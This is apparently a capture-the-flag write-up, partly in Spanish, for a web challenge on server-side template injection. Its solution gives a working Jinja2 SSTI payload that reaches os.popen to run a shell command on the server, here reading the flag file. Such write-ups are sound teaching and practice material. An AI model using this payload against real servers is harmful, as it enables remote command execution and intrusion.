## Descripción 
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
## Hints
1. Server Side Template Injection
## Solución
```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read()}}

```
## Notas
SSTI ocurre cuando una entrada del usuario se renderiza directamente en una plantilla del servidor; así puedes inyectar expresiones que el motor de plantillas evaluará en el servidor.
## Referencias
